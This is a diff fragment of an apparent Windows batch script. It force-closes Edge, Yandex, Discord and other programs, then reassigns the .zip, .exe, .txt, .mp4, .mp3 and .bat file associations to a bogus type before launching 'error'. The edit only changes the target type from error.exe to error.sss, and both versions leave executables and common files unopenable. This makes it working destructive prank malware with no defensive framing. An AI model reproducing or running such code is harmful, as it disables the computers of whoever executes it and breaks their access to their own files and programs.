@@ -30,12 +30,12 @@ taskkill /f /im microsoftedge.exe
 taskkill /f /im mrsmjrgui.exe
 taskkill /f /im yandex.exe
 taskkill /f /im discord.exe
-assoc .zip=error.exe
-assoc .exe=error.exe
-assoc .txt=error.exe
-assoc .mp4=error.exe
-assoc .mp3=error.exe
-assoc .bat=error.exe
+assoc .zip=error.sss
+assoc .exe=error.sss
+assoc .txt=error.sss
+assoc .mp4=error.sss
+assoc .mp3=error.sss
+assoc .bat=error.sss
 start error
 
 exit
